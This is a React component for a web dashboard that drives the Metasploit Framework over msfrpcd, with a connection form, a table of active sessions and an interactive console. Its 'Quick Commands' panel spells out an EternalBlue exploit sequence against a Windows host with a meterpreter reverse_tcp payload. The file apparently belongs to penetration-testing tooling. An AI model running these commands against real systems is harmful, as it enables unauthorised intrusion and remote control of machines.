import { useEffect, useRef, useState } from "react";
import type { MsfSession, MsfStatus } from "../hooks/useMetasploit";

interface MetasploitPageProps {
  status: MsfStatus;
  sessions: MsfSession[];
  consoleId: string | null;
  consoleOutput: string;
  consolePrompt: string;
  consoleBusy: boolean;
  loading: boolean;
  error: string | null;
  onConnect: (host: string, port: number, username: string, password: string, ssl: boolean) => Promise<boolean>;
  onDisconnect: () => Promise<void>;
  onCreateConsole: () => Promise<void>;
  onDestroyConsole: () => Promise<void>;
  onWriteConsole: (command: string) => Promise<void>;
}

function ConnectionPanel({
  status,
  loading,
  error,
  onConnect,
  onDisconnect,
}: {
  status: MsfStatus;
  loading: boolean;
  error: string | null;
  onConnect: MetasploitPageProps["onConnect"];
  onDisconnect: MetasploitPageProps["onDisconnect"];
}) {
  const [host, setHost] = useState("127.0.0.1");
  const [port, setPort] = useState("55553");
  const [username, setUsername] = useState("msf");
  const [password, setPassword] = useState("");
  const [ssl, setSsl] = useState(false);

  async function handleConnect(e: React.FormEvent) {
    e.preventDefault();
    await onConnect(host, Number(port), username, password, ssl);
  }

  if (status.connected) {
    return (
      <div className="glass-card panel-shell panel-inner-glow fade-in-up rounded-3xl p-5">
        <div className="mb-4 flex items-center justify-between">
          <div>
            <p className="text-[11px] uppercase tracking-[0.24em] text-slate-500">Metasploit Framework</p>
            <h2 className="mt-1 text-xl font-semibold text-white">Connected</h2>
          </div>
          <div className="flex items-center gap-2">
            <span className="inline-flex h-2.5 w-2.5 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.6)]" />
            <span className="text-sm text-emerald-300">Online</span>
          </div>
        </div>

        <div className="mb-4 flex flex-wrap gap-2">
          <span className="status-pill">RPC {status.rpcUrl}</span>
          {status.version && <span className="status-pill">Version {status.version}</span>}
        </div>

        <button
          className="rounded-2xl border border-rose-500/30 bg-rose-500/10 px-4 py-2.5 text-sm font-medium text-rose-300 transition duration-300 hover:bg-rose-500/20"
          onClick={() => void onDisconnect()}
          type="button"
        >
          Disconnect
        </button>
      </div>
    );
  }

  return (
    <div className="glass-card panel-shell panel-inner-glow fade-in-up rounded-3xl p-5">
      <div className="mb-4">
        <p className="text-[11px] uppercase tracking-[0.24em] text-slate-500">Metasploit Framework</p>
        <h2 className="mt-1 text-xl font-semibold text-white">Connect to msfrpcd</h2>
        <p className="mt-2 text-sm text-slate-400">
          Start msfrpcd on Kali:&nbsp;
          <code className="rounded bg-slate-800/80 px-2 py-0.5 text-xs text-emerald-300">
            msfrpcd -U msf -P yourpass -S false
          </code>
        </p>
      </div>

      {error && (
        <div className="mb-4 rounded-2xl border border-rose-500/20 bg-rose-500/10 px-4 py-3 text-sm text-rose-300">
          {error}
        </div>
      )}

      <form className="grid gap-3 sm:grid-cols-2" onSubmit={(e) => void handleConnect(e)}>
        <label className="block">
          <span className="mb-1 block text-xs text-slate-400">Host</span>
          <input
            className="w-full rounded-xl border border-slate-700/80 bg-slate-900/60 px-3 py-2.5 text-sm text-white placeholder-slate-600 outline-none transition focus:border-emerald-500/50"
            onChange={(e) => setHost(e.target.value)}
            placeholder="127.0.0.1"
            value={host}
          />
        </label>
        <label className="block">
          <span className="mb-1 block text-xs text-slate-400">Port</span>
          <input
            className="w-full rounded-xl border border-slate-700/80 bg-slate-900/60 px-3 py-2.5 text-sm text-white placeholder-slate-600 outline-none transition focus:border-emerald-500/50"
            onChange={(e) => setPort(e.target.value)}
            placeholder="55553"
            value={port}
          />
        </label>
        <label className="block">
          <span className="mb-1 block text-xs text-slate-400">Username</span>
          <input
            className="w-full rounded-xl border border-slate-700/80 bg-slate-900/60 px-3 py-2.5 text-sm text-white placeholder-slate-600 outline-none transition focus:border-emerald-500/50"
            onChange={(e) => setUsername(e.target.value)}
            placeholder="msf"
            value={username}
          />
        </label>
        <label className="block">
          <span className="mb-1 block text-xs text-slate-400">Password</span>
          <input
            className="w-full rounded-xl border border-slate-700/80 bg-slate-900/60 px-3 py-2.5 text-sm text-white placeholder-slate-600 outline-none transition focus:border-emerald-500/50"
            onChange={(e) => setPassword(e.target.value)}
            placeholder="password"
            type="password"
            value={password}
          />
        </label>

        <label className="flex items-center gap-2 text-sm text-slate-300 sm:col-span-2">
          <input
            checked={ssl}
            className="h-4 w-4 rounded border-slate-600 bg-slate-800 text-emerald-500 accent-emerald-500"
            onChange={(e) => setSsl(e.target.checked)}
            type="checkbox"
          />
          Use SSL/TLS
        </label>

        <div className="sm:col-span-2">
          <button
            className="rounded-2xl bg-emerald-500 px-5 py-2.5 text-sm font-medium text-slate-950 transition duration-300 hover:-translate-y-0.5 hover:shadow-lg hover:shadow-emerald-500/25 disabled:opacity-50"
            disabled={loading || !host || !password}
            type="submit"
          >
            {loading ? "Connecting..." : "Connect"}
          </button>
        </div>
      </form>
    </div>
  );
}

function SessionsTable({ sessions }: { sessions: MsfSession[] }) {
  return (
    <div className="glass-card panel-shell panel-inner-glow fade-in-up rounded-3xl p-5">
      <div className="mb-4">
        <p className="text-[11px] uppercase tracking-[0.24em] text-slate-500">Active Sessions</p>
        <h2 className="mt-1 text-xl font-semibold text-white">
          {sessions.length} Session{sessions.length !== 1 ? "s" : ""}
        </h2>
      </div>

      {sessions.length === 0 ? (
        <p className="text-sm text-slate-500">No active sessions. Exploit a target to create one.</p>
      ) : (
        <div className="overflow-x-auto">
          <table className="w-full text-left text-sm">
            <thead>
              <tr className="border-b border-slate-800 text-[11px] uppercase tracking-[0.18em] text-slate-500">
                <th className="pb-3 pr-4">ID</th>
                <th className="pb-3 pr-4">Type</th>
                <th className="pb-3 pr-4">Target</th>
                <th className="pb-3 pr-4">Exploit</th>
                <th className="pb-3 pr-4">Payload</th>
                <th className="pb-3 pr-4">Platform</th>
                <th className="pb-3">Info</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60">
              {sessions.map((s) => (
                <tr className="transition-colors hover:bg-slate-800/30" key={s.id}>
                  <td className="py-3 pr-4 font-mono text-emerald-300">#{s.id}</td>
                  <td className="py-3 pr-4">
                    <span
                      className={`inline-block rounded-full px-2 py-0.5 text-xs font-medium ${
                        s.type === "meterpreter"
                          ? "bg-purple-500/15 text-purple-300"
                          : "bg-sky-500/15 text-sky-300"
                      }`}
                    >
                      {s.type}
                    </span>
                  </td>
                  <td className="py-3 pr-4 font-mono text-xs text-slate-300">{s.tunnel_peer || s.session_host}</td>
                  <td className="max-w-48 truncate py-3 pr-4 text-xs text-slate-400">{s.via_exploit}</td>
                  <td className="max-w-48 truncate py-3 pr-4 text-xs text-slate-400">{s.via_payload}</td>
                  <td className="py-3 pr-4 text-xs text-slate-400">{s.platform} / {s.arch}</td>
                  <td className="max-w-48 truncate py-3 text-xs text-slate-400">{s.info || s.desc}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

function MsfConsole({
  consoleId,
  consoleOutput,
  consolePrompt,
  consoleBusy,
  onCreateConsole,
  onDestroyConsole,
  onWriteConsole,
}: {
  consoleId: string | null;
  consoleOutput: string;
  consolePrompt: string;
  consoleBusy: boolean;
  onCreateConsole: () => Promise<void>;
  onDestroyConsole: () => Promise<void>;
  onWriteConsole: (command: string) => Promise<void>;
}) {
  const [input, setInput] = useState("");
  const [history, setHistory] = useState<string[]>([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const outputRef = useRef<HTMLPreElement>(null);

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [consoleOutput]);

  function handleKeyDown(e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Enter" && input.trim()) {
      void onWriteConsole(input);
      setHistory((prev) => [input, ...prev]);
      setHistoryIndex(-1);
      setInput("");
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      const nextIdx = Math.min(historyIndex + 1, history.length - 1);
      setHistoryIndex(nextIdx);
      if (history[nextIdx]) setInput(history[nextIdx]);
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      const nextIdx = historyIndex - 1;
      if (nextIdx < 0) {
        setHistoryIndex(-1);
        setInput("");
      } else {
        setHistoryIndex(nextIdx);
        if (history[nextIdx]) setInput(history[nextIdx]);
      }
    }
  }

  if (!consoleId) {
    return (
      <div className="glass-card panel-shell panel-inner-glow fade-in-up rounded-3xl p-5">
        <div className="mb-4">
          <p className="text-[11px] uppercase tracking-[0.24em] text-slate-500">MSF Console</p>
          <h2 className="mt-1 text-xl font-semibold text-white">Interactive Console</h2>
        </div>
        <button
          className="rounded-2xl bg-emerald-500 px-5 py-2.5 text-sm font-medium text-slate-950 transition duration-300 hover:-translate-y-0.5 hover:shadow-lg hover:shadow-emerald-500/25"
          onClick={() => void onCreateConsole()}
          type="button"
        >
          Open Console
        </button>
      </div>
    );
  }

  return (
    <div className="glass-card panel-shell panel-inner-glow fade-in-up rounded-3xl p-5">
      <div className="mb-4 flex items-center justify-between">
        <div>
          <p className="text-[11px] uppercase tracking-[0.24em] text-slate-500">MSF Console</p>
          <h2 className="mt-1 text-xl font-semibold text-white">Interactive Console</h2>
        </div>
        <div className="flex items-center gap-3">
          {consoleBusy && (
            <span className="inline-flex items-center gap-1.5 text-xs text-amber-300">
              <span className="inline-block h-1.5 w-1.5 animate-pulse rounded-full bg-amber-400" />
              Processing...
            </span>
          )}
          <button
            className="rounded-2xl border border-rose-500/30 bg-rose-500/10 px-3 py-1.5 text-xs font-medium text-rose-300 transition duration-300 hover:bg-rose-500/20"
            onClick={() => void onDestroyConsole()}
            type="button"
          >
            Close Console
          </button>
        </div>
      </div>

      <pre
        className="mb-3 h-80 overflow-auto rounded-2xl border border-slate-800 bg-black/60 p-4 font-mono text-xs leading-5 text-green-400 scrollbar-thin scrollbar-track-transparent scrollbar-thumb-slate-700"
        ref={outputRef}
      >
        {consoleOutput || "Waiting for output...\n"}
      </pre>

      <div className="flex items-center gap-2 rounded-xl border border-slate-700/80 bg-slate-900/60 px-3 py-1">
        <span className="shrink-0 font-mono text-xs text-emerald-400">{consolePrompt}</span>
        <input
          autoFocus
          className="w-full bg-transparent py-2 font-mono text-xs text-white outline-none placeholder:text-slate-600"
          disabled={consoleBusy}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={handleKeyDown}
          placeholder="Type a command..."
          value={input}
        />
      </div>
    </div>
  );
}

function QuickReference() {
  const commands = [
    { cmd: "search type:exploit name:smb", desc: "Search for SMB exploits" },
    { cmd: "use exploit/windows/smb/ms17_010_eternalblue", desc: "Select an exploit module" },
    { cmd: "set RHOSTS 10.10.10.5", desc: "Set target host" },
    { cmd: "set PAYLOAD windows/x64/meterpreter/reverse_tcp", desc: "Set payload" },
    { cmd: "set LHOST 10.10.10.10", desc: "Set listener host" },
    { cmd: "show options", desc: "Review current options" },
    { cmd: "exploit", desc: "Launch the exploit" },
    { cmd: "sessions -l", desc: "List active sessions" },
    { cmd: "sessions -i 1", desc: "Interact with session" },
  ];

  return (
    <div className="glass-card panel-shell panel-inner-glow fade-in-up rounded-3xl p-5">
      <div className="mb-4">
        <p className="text-[11px] uppercase tracking-[0.24em] text-slate-500">Reference</p>
        <h2 className="mt-1 text-xl font-semibold text-white">Quick Commands</h2>
      </div>
      <div className="space-y-2">
        {commands.map((item) => (
          <div className="flex items-start gap-3 rounded-xl px-3 py-2 transition hover:bg-slate-800/40" key={item.cmd}>
            <code className="shrink-0 rounded-lg bg-slate-800/80 px-2 py-0.5 font-mono text-xs text-emerald-300">
              {item.cmd}
            </code>
            <span className="text-xs text-slate-400">{item.desc}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

export function MetasploitPage({
  status,
  sessions,
  consoleId,
  consoleOutput,
  consolePrompt,
  consoleBusy,
  loading,
  error,
  onConnect,
  onDisconnect,
  onCreateConsole,
  onDestroyConsole,
  onWriteConsole,
}: MetasploitPageProps) {
  return (
    <div className="space-y-6">
      <ConnectionPanel
        error={error}
        loading={loading}
        onConnect={onConnect}
        onDisconnect={onDisconnect}
        status={status}
      />

      {status.connected && (
        <>
          <section className="grid gap-4 lg:grid-cols-3">
            <div className="lg:col-span-2">
              <SessionsTable sessions={sessions} />
            </div>
            <QuickReference />
          </section>

          <MsfConsole
            consoleBusy={consoleBusy}
            consoleId={consoleId}
            consoleOutput={consoleOutput}
            consolePrompt={consolePrompt}
            onCreateConsole={onCreateConsole}
            onDestroyConsole={onDestroyConsole}
            onWriteConsole={onWriteConsole}
          />
        </>
      )}
    </div>
  );
}
